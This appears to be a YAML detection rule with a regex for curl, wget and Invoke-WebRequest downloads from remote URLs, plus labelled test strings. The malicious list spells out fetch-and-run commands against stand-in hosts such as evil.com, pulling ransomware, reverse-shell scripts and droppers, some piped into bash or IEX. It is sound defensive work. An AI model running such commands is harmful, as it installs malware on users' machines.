name: experimental-high-05-download-commands
severity: high-experimental
description: >
  Detects general download commands (curl, wget, IWR) from remote URLs. Requires allowlisting for legitimate use.

pattern: |
  (?i)(?:curl|wget|Invoke-WebRequest|IWR)[\s\r\n]+(?:[^\r\n]*?(?:-Uri|-OutFile|-o|-O|-Method)[\s\r\n]+)?[^\r\n]*?(?:http://|https://|ftp://)

malicious:
  - "curl http://evil.com/malware.exe -o malware.exe"
  - "wget https://attacker.com/payload.sh"
  - "Invoke-WebRequest http://malware.com/backdoor.dll -OutFile backdoor.dll"
  - "IWR https://evil.com/dropper.ps1 | IEX"
  - "curl -fsSL http://bad.com/script.sh | bash"
  - "wget -qO- http://evil.com/exploit.sh | sh"
  - "curl http://192.168.1.100/clickfix.exe -o clickfix.exe"
  - "Invoke-WebRequest -Uri http://evil.com/ransomware.exe -OutFile C:\\Temp\\ransomware.exe"
  - "wget ftp://attacker.com/trojan.bin -O /tmp/trojan.bin"
  - "IWR http://malware.com/implant.dll -Method Get -OutFile implant.dll"
  - "curl -s http://evil.com/reverse-shell.sh -o /tmp/rs.sh"
  - "wget --no-check-certificate https://evil.com/malware.exe"
  - "Invoke-WebRequest https://attacker.com/stage2.ps1 -UseBasicParsing -OutFile stage2.ps1"
  - "curl http://evil.com/backdoor.py -o backdoor.py"
  - "wget -q http://malware.com/loader.dll"

benign:
  - "curl http://api.example.com/data"
  - "wget https://releases.ubuntu.com/20.04/ubuntu.iso"
  - "Invoke-WebRequest https://www.microsoft.com"
  - "curl https://api.github.com/repos"
  - "wget http://localhost:8080/status"
  - "IWR https://aka.ms/install-powershell.ps1"
  - "curl https://get.docker.com | bash"
  - "wget https://packages.microsoft.com/config/ubuntu/packages-microsoft-prod.deb"
  - "Invoke-WebRequest -Uri https://dist.nuget.org/win-x86-commandline/latest/nuget.exe -OutFile nuget.exe"
  - "curl https://sh.rustup.rs -sSf | sh"
  - "wget https://nodejs.org/dist/v18.0.0/node-v18.0.0-linux-x64.tar.gz"
  - "IWR https://download.sysinternals.com/files/SysinternalsSuite.zip -OutFile SysinternalsSuite.zip"
  - "curl https://raw.githubusercontent.com/user/repo/main/install.sh | bash"
  - "wget https://dl.k8s.io/release/stable.txt"
  - "Invoke-WebRequest https://chocolatey.org/install.ps1 -UseBasicParsing | IEX"
  - "curl https://api.ipify.org"
  - "wget https://deb.nodesource.com/setup_18.x -O - | bash"
